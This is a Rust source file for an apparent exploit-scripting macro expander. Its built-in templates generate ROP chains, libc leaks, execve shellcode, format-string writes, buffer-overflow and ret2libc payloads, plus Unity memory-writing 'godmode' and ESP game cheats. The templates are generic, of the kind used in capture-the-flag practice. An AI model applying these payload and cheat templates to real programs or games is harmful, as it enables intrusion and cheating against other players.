#![allow(dead_code)]

use std::collections::HashMap;

#[derive(Debug, Clone)]
pub struct Macro {
    pub name: String,
    pub parameters: Vec<String>,
    pub template: String,
}

pub struct MacroExpander {
    macros: HashMap<String, Macro>,
}

impl MacroExpander {
    pub fn new() -> Self {
        let mut expander = MacroExpander {
            macros: HashMap::new(),
        };
        expander.register_builtin_macros();
        expander
    }

    fn register_builtin_macros(&mut self) {
        self.register_macro(Macro {
            name: "rop_chain".to_string(),
            parameters: vec!["gadgets".to_string()],
            template: r#"
let chain = bytes("")
for gadget in {gadgets}
    chain = chain + p64(gadget)
end
chain
"#
            .to_string(),
        });

        self.register_macro(Macro {
            name: "leak_libc".to_string(),
            parameters: vec!["puts_got".to_string(), "puts_plt".to_string()],
            template: r#"
let payload = cyclic(offset) + p64({puts_plt}) + p64({puts_got})
send(conn, payload)
let leak = u64(recv(conn, 8))
let libc_base = leak - PUTS_OFFSET
print("Libc base:", hex(libc_base))
libc_base
"#
            .to_string(),
        });

        self.register_macro(Macro {
            name: "shellcode_execve".to_string(),
            parameters: vec!["arch".to_string()],
            template: r#"
shellcode({arch}, "execve", "/bin/sh")
"#
            .to_string(),
        });

        self.register_macro(Macro {
            name: "format_string_exploit".to_string(),
            parameters: vec![
                "offset".to_string(),
                "target".to_string(),
                "value".to_string(),
            ],
            template: r#"
let writes = [
    ({target}, {value} & 0xFF),
    ({target} + 1, ({value} >> 8) & 0xFF),
    ({target} + 2, ({value} >> 16) & 0xFF),
    ({target} + 3, ({value} >> 24) & 0xFF)
]
let payload = ""
for write in writes
    payload = payload + "%{}x%{}$hhn".format(write[1], {offset})
end
payload
"#
            .to_string(),
        });

        self.register_macro(Macro {
            name: "unity_godmode".to_string(),
            parameters: vec!["proc".to_string(), "player_class".to_string()],
            template: r#"
let pid = {proc}["pid"]
let players = unity_find_objects({player_class})
if len(players) > 0
    let player = players[0]
    let health = unity_get_component(player["address"], "Health")
    mem_write(pid, health["address"] + 0x10, p32(99999))
    
    let ammo = unity_get_component(player["address"], "Ammo")
    mem_write(pid, ammo["address"] + 0x14, p32(99999))
    
    print("God mode activated!")
end
"#
            .to_string(),
        });

        self.register_macro(Macro {
            name: "buffer_overflow_exploit".to_string(),
            parameters: vec![
                "offset".to_string(),
                "target".to_string(),
                "payload".to_string(),
            ],
            template: r#"
let exploit = cyclic({offset}) + p64({target}) + {payload}
exploit
"#
            .to_string(),
        });

        self.register_macro(Macro {
            name: "ret2libc".to_string(),
            parameters: vec![
                "offset".to_string(),
                "system_addr".to_string(),
                "binsh_addr".to_string(),
                "pop_rdi".to_string(),
            ],
            template: r#"
let chain = cyclic({offset})
chain = chain + p64({pop_rdi})
chain = chain + p64({binsh_addr})
chain = chain + p64({system_addr})
chain
"#
            .to_string(),
        });

        self.register_macro(Macro {
            name: "pattern_create".to_string(),
            parameters: vec!["length".to_string()],
            template: r#"
cyclic({length})
"#
            .to_string(),
        });

        self.register_macro(Macro {
            name: "pattern_offset".to_string(),
            parameters: vec!["pattern".to_string()],
            template: r#"
cyclic_find({pattern})
"#
            .to_string(),
        });

        self.register_macro(Macro {
            name: "game_esp".to_string(),
            parameters: vec!["pid".to_string(), "entity_list".to_string()],
            template: r#"
esp_create({pid}, {entity_list})
let entities = entity_iterate({pid}, {entity_list})
for entity in entities
    let pos = [entity["x"], entity["y"], entity["z"]]
    let screen = world_to_screen(pos, view_matrix)
    if screen["visible"]
        esp_draw_box(screen["x"], screen["y"], 50, 100)
    end
end
"#
            .to_string(),
        });
    }

    pub fn register_macro(&mut self, macro_def: Macro) {
        self.macros.insert(macro_def.name.clone(), macro_def);
    }

    pub fn expand(&self, macro_name: &str, args: &[String]) -> Result<String, String> {
        let macro_def = self
            .macros
            .get(macro_name)
            .ok_or_else(|| format!("Macro '{}' not found", macro_name))?;

        if args.len() != macro_def.parameters.len() {
            return Err(format!(
                "Macro '{}' expects {} arguments, got {}",
                macro_name,
                macro_def.parameters.len(),
                args.len()
            ));
        }

        let mut expanded = macro_def.template.clone();

        for (param, arg) in macro_def.parameters.iter().zip(args.iter()) {
            let placeholder = format!("{{{}}}", param);
            expanded = expanded.replace(&placeholder, arg);
        }

        Ok(expanded.trim().to_string())
    }

    pub fn expand_code(&self, source: &str) -> Result<String, String> {
        let mut result = source.to_string();
        let macro_pattern =
            regex::Regex::new(r"(\w+)!\s*\((.*?)\)").map_err(|e| format!("Regex error: {}", e))?;

        for cap in macro_pattern.captures_iter(source) {
            let macro_name = &cap[1];
            let args_str = &cap[2];

            let args: Vec<String> = if args_str.trim().is_empty() {
                Vec::new()
            } else {
                args_str.split(',').map(|s| s.trim().to_string()).collect()
            };

            let expanded = self.expand(macro_name, &args)?;
            let full_match = &cap[0];
            result = result.replace(full_match, &expanded);
        }

        Ok(result)
    }

    pub fn list_macros(&self) -> Vec<&Macro> {
        self.macros.values().collect()
    }

    pub fn get_macro(&self, name: &str) -> Option<&Macro> {
        self.macros.get(name)
    }
}

pub fn parse_macro_definition(source: &str) -> Option<Macro> {
    let lines: Vec<&str> = source.lines().collect();

    for (i, line) in lines.iter().enumerate() {
        let trimmed = line.trim();

        if trimmed.starts_with("macro ") {
            let parts: Vec<&str> = trimmed.split_whitespace().collect();
            if parts.len() < 2 {
                continue;
            }

            let name_and_params = parts[1];
            let mut name = name_and_params.to_string();
            let mut parameters = Vec::new();

            if let Some(paren_start) = name_and_params.find('(') {
                if let Some(paren_end) = name_and_params.find(')') {
                    name = name_and_params[..paren_start].to_string();
                    let params_str = &name_and_params[paren_start + 1..paren_end];
                    parameters = params_str
                        .split(',')
                        .map(|s| s.trim().to_string())
                        .filter(|s| !s.is_empty())
                        .collect();
                }
            }

            let mut template = String::new();
            for j in (i + 1)..lines.len() {
                if lines[j].trim() == "end" || lines[j].trim().starts_with("end ") {
                    break;
                }
                template.push_str(lines[j]);
                template.push('\n');
            }

            return Some(Macro {
                name,
                parameters,
                template: template.trim().to_string(),
            });
        }
    }

    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_macro_expansion() {
        let expander = MacroExpander::new();

        let result = expander.expand("pattern_create", &["100".to_string()]);
        assert!(result.is_ok());
        assert!(result.unwrap().contains("cyclic(100)"));
    }

    #[test]
    fn test_rop_chain_macro() {
        let expander = MacroExpander::new();

        let result = expander.expand("rop_chain", &["[0x401234, 0x401567, 0x401890]".to_string()]);
        assert!(result.is_ok());
    }

    #[test]
    fn test_expand_code() {
        let expander = MacroExpander::new();
        let source = r#"
let offset = 264
let payload = pattern_create!(100)
let target = 0x401234
"#;

        let result = expander.expand_code(source);
        assert!(result.is_ok());
    }
}
